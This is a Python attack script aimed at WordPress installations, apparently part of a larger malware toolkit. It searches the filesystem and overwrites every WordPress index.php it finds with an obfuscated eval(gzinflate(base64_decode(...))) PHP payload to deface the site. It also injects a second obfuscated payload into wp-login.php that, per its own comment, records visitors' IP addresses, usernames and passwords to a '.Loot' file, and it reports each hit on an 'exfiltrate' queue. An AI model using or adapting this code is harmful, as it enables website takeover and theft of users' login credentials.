#!/usr/bin/env python3
import os
from queue import Queue

def get_path(f_name):
    founds = []
    try:
        for root, dirs, files in os.walk('/',topdown=True):
            for name in files:
                if name == f_name:
                    f_path = os.path.abspath(os.path.join(root, name))
                    founds.append(f_path)
    except:
        pass
    return founds

def defacement(index_path):
    try:
        payload = '''<?php eval(gzinflate(base64_decode("DdJHEqNIAgDAv8ypO3TAG8We8E54hIDLBN57Cihev5NvyPJMhz/1007VkB7lnyzdS5r8tyjzuSj//CMWGrYfd8xxIgeeFvqsFHSYC3hq9kzMhvovU9ByIiZaYWzdeRXIF43f/VQiEhNkqXA7yKfFH6N9vxBcfgSghNGoLYN48uYCzXsoDxZVsZaeitjXfHTC0/H2UP0SoqHMG0wz4q8T8J0SHKfyTbxlwriKKm6EJXlbC9S5UjkXfOMR08kHZ2iwpk4f+eqpktALPT/0vL7cSzwhzoopHfsjeYXfz6nNsWNJXFqVE7/vK5WpIyxPoQXf9/p+9q7sMJzp7zMiKZlAPKVM6/EUVLN3GVxacJXnAA+CdS8fh15T7yPrccOdRehyhcmqxA4T2KDzZvmpxAPg5aQdcAjUW2JJetC8V730flh2jNuSaHItBtlyvVBBs3PlMK/g8IQ6X8Lt9kRfIYTZC2GaurLn4n3OvMhNQZXfVsgYT76dWTz1AgtXJ6Nmg4B79h0tdDoNiQTU1u219JMejyOMYjRZymOzsm28wcB5NH8FVolw6/07yPFnf4pNcNOey3wWext+96tQNAhhNXc/p9BBc3fuS8dAweZaltvvBS7ShwTox129o3ORuwNinic4X/YrSnViTc7205yP7Ttj5qp7BHClBcr3AbHmS8KLCJ1dDMaNoDWP6MMzz71W2rjiih4R9t8EhgUuPP75iWt+w2RYfax4IdkxfHbebtTTLgY1MeHZu9eTUy4Gx7aY8Mi5nX2NaAH1HWvZUuRCXaNydPmzB5aFoTxIQ49RMwXq1tb5cfjwCfBkb8CrKU9MlAQ67XJo4741779A1/vtxinBhSsDYEiL8FCFE5D+QGn6dN/kKfMKNB+z8gUlgiw2iw3dtB2iR59Hb+GIqra8U6yECU28MQuaq3MWaRihRVG1X+cb3hv4yMObts5Fspad/WCV1qGUoKkxX8CV8XEZmylgDaA6zWGvja8eYmHaYMzcLqABAr3Ad1ST2qR2dSCI2TZd0WrwAUyZowZGrJsRyph62H+pqeDNt1pVIU8PdE+Hto5o2sJnYR9+EgPhXinekhNp5QSgJnjnReiznAkYp/0axlG78JzWYNVBjeqUeBCNvBautI1XgK5O4yKqLnQ1V1Kz2UeBcoWHeJcL1ck0RrS8l4+WZvdYMXhxo/MTq31LRfygyIqZhIrahr+aNtD9h4gPoekqpd4O//ym5WOVvwZOjawXJVvDAfE0/oqN0yMV+gFEX5ceGfp0wMZLjX4b/vtSwqcKM3kUVLoZVXzNrqpdHILiN9uzA2rbwnYffy1Gm462zDvtQfk6elzE9kgMnIPa7q2NB48q8gWHhKQSAUDp5KZZmZlYxxNnHeXuOHmvMqRNREloRU/TVAXLqKBfinvflRF0UjNET6ndo/Mayid3i1F0dMfJQBJcuuEoQdinpEV2A+NCVepk//MoWv2Dj7qzABY10+8WLgst/1ITFFPa+Ugwnmqq65HSHyvHJJ40j2gN/tUKZ1I+jDLcFlM9KlLwmzHUfMrNtUDFPe9qU3QSLwQ5H4pFCuSfv3///u//"))); ?>'''
        f_data = open(index_path, "w")
        f_data.writelines(payload)
        f_data.close()
        return True
    except:
        return False

def earsdropping(login_path):
    try:
        # file_put_contents(".Loot", $_SERVER['REMOTE_ADDR'] . " - " . $_POST['log'] . ":" . $_POST['pwd'] . "\n", FILE_APPEND);
        payload = '''eval(gzinflate(base64_decode("DZJHrqNYAADv0qtusXjkoFYviDbxEUzcjAADJoPJnH7+CapKqmJPu9/VXQ9ll67F7yxdCpr8713k47v4/UvKMWWZ3ZjnJX4D3gyxqpJIXIs2IaTlXLc+ps9FAgFtzIxq6dNGIbjovKhrJiMhZ6+tngI7N1ggGyVAvH1M8Vvb4UVpQFERW+YzQH/QvNnPjlF9jA3kscDLMmQRU9XFlmM69nDwhMIhnSGzdDkfdrc12fRCX1A7afUfy7BuK14cAW/XNercex8X4UqcRztPeFcLteIitnBHBJH4bds32SwI7DbWPvHBMKpxmDgbrfMELXojVrcecKYKGf/46U5RRLYKvbkHciIpUFb7nMaJWWhtxnbF65CtkmPInHOSjxJWq+9Xia5shjFhTlojphkchGEabC49F0sqK9IM2xrulOATgZ4EyGTGA26r+yRgeFbmfIn7qmb30C+QgXv5c38GBqeEBntDQDo1RoV5yvdP6gvtmfYZQjTN3rtZX9teS9dog2hJ89BIFLqfn2cAX7I21fxsbTdWnQ84caiAqyxiHE9a4XL1sbDvJCmy2rTYB+4A5fX12QV5M320B/n0EV0XzmroPuG+yzjtAP4Y3+E4hDy2/JyypjkhBtM2Z18LPQjU00JapJYRlEMlB2fbnycLohKEvIEqL2Jx2mFGSFqlFtumownwbR8JhVK8/eZ1MfWsbVJD4A3QX0M4uaV7i46dZfSkGv5Fuhy09l1MtMUnNB47raa079qDgdniq48Mviiz2BhHAR/xaARufoyvzN+lQpvVSUJia2IdZMgXtd4k2QnRyVg7T3laPBpf853QkggJZfUKMOFIr+Z0fbiA10nlyqTnD7YiFUFEHlAMUU3Rx9umYff5WDL5YlinP/FIm5rF7SufcLZvkxzoO7EMNQaxM4UkzHp7DFNrmdmaLnywO4j/7dzaR6K36J8sMSFATiPUwdR+S7EfKSwlPj2vdLT8pQyfC201CBZ/z+7ne7zOL0Q+A78UxvaOS9L8kgnB8qBWCHx6GtCkXw/k3Wic9OgZRuqj+ZU/kTsvdvFLKbKp6O5RxUWnVftFim9dXIC9jjXCwSh89RdIOmk+RjjwTkJkrUK1XYHKkBGCnIpe3cGTaIn2fPP1puEYqSd97cVWCNsNs8mK2f0LiXQFY7BnyGhGTkvl/jxEfGtKw65hVbp6Vp7q6xieChQKbrUDYrvCICtACTfaKDM5nCz0Q9JkpgPp1CBGp60GKW/YrEDjEZeOv+4ypXazYoSz3hYSMTuZ66v+JN2Wz6rAfqfW+8E/CCw5HFrzXrYemx8UUt2XetxnjNEG81Qs1oEt9hw6FauUmvWKM413IaDx3SttyyEnCV75yX1Z9+VlV2DK8pp9X2vlOwsTICUgwehS6ACSUov1r+zFgXix8ZtIsJ/mexh7ar5HhmnUspdUTi6tBReb+mzUlHhcB0FNYmfv6dM0JbWodRuSFIeAHTAsUtp2efz79+vPnz9//wc=")));'''
        place = "case 'login':"
        f_data = open(login_path, "r")
        data = f_data.readlines()
        for index, line in enumerate(data, start=0):
            if place in line:
                t = line.rstrip().replace(place,'')
                data[index]=f'{line.rstrip()}\n{t}\t{payload}\n'
        a_file = open('out', "w")
        a_file.writelines(data)
        a_file.close()
        return True
    except:
        return False

def defacement_main(exfiltrate: Queue):

    # Main Side defacement - index.php
    for index_path in get_path('index.php'):
        if 'wordpress' in index_path.lower():
            # print(f'Defacement at {index_path}')
            if defacement(index_path):
                exfiltrate.put(f"[DEFACEMENT] {index_path}")

    # Login earsdropping - wp-login.php
    for login_path in get_path('wp-login.php'):
        if 'wordpress' in login_path.lower():
            # print(f'Earsdropping at {login_path}')
            if earsdropping(login_path):
                exfiltrate.put(f"[EARSDROPPING] {login_path}")
    
if __name__ == '__main__':
    defacement_main(Queue())


